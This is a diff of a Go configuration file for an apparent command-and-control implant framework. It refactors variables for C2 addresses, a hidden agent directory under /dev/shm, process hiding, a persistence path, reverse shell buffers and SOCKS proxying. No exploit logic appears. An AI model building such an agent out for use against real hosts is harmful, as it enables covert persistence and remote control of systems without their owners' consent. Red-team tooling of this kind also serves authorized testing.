@@ -11,17 +11,8 @@ import (
 )
 
 var (
-	// CCAddress how our agent finds its CC
-	CCAddress = ""
-
-	// CCIP IP address of CC
-	CCIP = ""
-
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
 	Transport = "HTTP2"
-
-	// AESKey generated from Tag -> md5sum, type: []byte
-	AESKey = genAESKey("Your Pre Shared AES Key: " + OpSep)
 
 	// HTTPClient handles agent's http communication
 	HTTPClient *http.Client
@@ -32,18 +23,6 @@ var (
 	// ProxyServer Socks5 proxy listening on agent
 	ProxyServer *socks5.Server
 
-	// AgentProxy used by this agent to communicate with CC server
-	AgentProxy = ""
-
-	// DoHServer DNS over HTTPS server for global name resolving
-	DoHServer = ""
-
-	// CDNProxy websocket address of the C2 behind CDN
-	CDNProxy = ""
-
-	// SocketName name of our unix socket
-	SocketName = ""
-
 	// HIDE_PIDS all the processes
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
 
@@ -53,68 +32,19 @@ var (
 	// GuardianAgentPath where the agent binary is stored
 	GuardianAgentPath = "[persistence_agent_path]"
 
-	// AgentRoot root directory
-	AgentRoot = ""
+	// will be updated by ReadJSONConfig
+	CCAddress    = ""
+	LibPath      = ""
+	DefaultShell = ""
 
-	// UtilsPath binary path of utilities
-	UtilsPath = ""
-
-	// LibPath
-	LibPath = AgentRoot + "/lib"
-
-	// DefaultShell the shell to use, use static bash binary when possible
-	DefaultShell = UtilsPath + "/bash"
-
-	// PIDFile stores agent PID
-	PIDFile = ""
-
-	// CCPort port of c2
-	CCPort = ""
-
-	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
-	ProxyPort = ""
-
-	// SSHDPort port of sshd
-	SSHDPort = ""
-
-	// ReverseProxyPort for reverse proxy
-	ReverseProxyPort = ""
-
-	// BroadcastPort port of broadcast server
-	BroadcastPort = ""
-
-	// BroadcastIntervalMin broadcast wait seconds
-	BroadcastIntervalMin = 30
-
-	// BroadcastIntervalMax broadcast wait seconds
-	BroadcastIntervalMax = 120
-
-	// CCIndicator check this before trying connection
-	CCIndicator = ""
-
-	// CCIndicatorText content of your indicator file
-	CCIndicatorText = ""
-
-	// IndicatorWaitMin cc indicator wait seconds
-	IndicatorWaitMin = 30
-
-	// IndicatorWaitMax cc indicator wait seconds
-	IndicatorWaitMax = 120
-
-	// AgentUUID uuid of this agent
-	AgentUUID = ""
-
-	// AgenTag tag of this agent
-	AgentTag = ""
+	// AESKey generated from Tag -> md5sum, type: []byte
+	AESKey []byte
 )
 
 const (
 	// Version hardcoded version string
 	// see https://github.com/googleapis/release-please/blob/f398bdffdae69772c61a82cd7158cca3478c2110/src/updaters/generic.ts#L30
 	Version = "v1.4.1" // x-release-please-version
-
-	// OpSep separator of CC payload
-	OpSep = ""
 
 	// RShellBufSize buffer size of reverse shell stream
 	RShellBufSize = 128
@@ -220,27 +150,6 @@ const (
 	C2CmdReverseProxy  = "!" + ModREVERSEPROXY
 	C2CmdStat          = "!stat"
 )
-
-// Config build.json config file
-type Config struct {
-	CCPort               string `json:"cc_port"`                // "cc_port": "5381",
-	ProxyPort            string `json:"proxy_port"`             // "proxy_port": "56238",
-	SSHDPort             string `json:"sshd_port"`              // "sshd_port": "2222",
-	BroadcastPort        string `json:"broadcast_port"`         // "broadcast_port": "58485",
-	BroadcastIntervalMin int    `json:"broadcast_interval_min"` // "broadcast_interval_min": 60, // seconds, set max to 0 to disable
-	BroadcastIntervalMax int    `json:"broadcast_interval_max"` // "broadcast_interval_max": 120, // seconds, set max to 0 to disable
-	CCIP                 string `json:"ccip"`                   // "ccip": "192.168.40.137",
-	AgentRoot            string `json:"agent_root"`             // "agent_root": "/dev/shm/.848ba",
-	PIDFile              string `json:"pid_file"`               // "pid_file": ".848ba.pid",
-	CCIndicator          string `json:"cc_indicator"`           // "cc_indicator": "cc_indicator",
-	IndicatorWaitMin     int    `json:"indicator_wait_min"`     // "indicator_wait_min": 60, // seconds
-	IndicatorWaitMax     int    `json:"indicator_wait_max"`     // "indicator_wait_max": 120, // seconds, set max to 0 to disable
-	CCIndicatorText      string `json:"indicator_text"`         // "indicator_text": "myawesometext"
-	CA                   string `json:"ca"`                     // CA cert from server side
-}
-
-// RuntimeConfig read all kinds of runtime parameters from here
-var RuntimeConfig = &Config{}
 
 // SystemInfo agent properties
 type SystemInfo struct {
